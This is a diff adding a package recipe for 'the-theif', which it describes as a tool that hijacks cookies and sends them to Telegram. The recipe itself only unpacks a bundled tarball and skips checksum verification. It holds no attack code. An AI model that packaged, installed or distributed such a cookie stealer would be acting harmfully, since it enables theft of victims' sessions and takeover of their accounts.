@@ -1,0 +1,21 @@
+# Maintainer: Alienkrishn [Anon4You]
+# Ported from TermuxVoid APT repo (packages/the-theif)
+
+pkgname="the-theif"
+pkgver=2.1
+pkgrel=0
+pkgdesc='A tool that can hijack cookies and transmit them to Telegram using the API.'
+arch=('any')
+depends=('apksigner' 'apkeditor' 'python')
+install="the-theif.install"
+options=('!strip')
+source=(the-theif-data.tar.gz)
+sha256sums=('SKIP')
+
+build() {
+    return 0
+}
+
+package() {
+    tar -xzf "${srcdir}/the-theif-data.tar.gz" -C "${pkgdir}"
+}
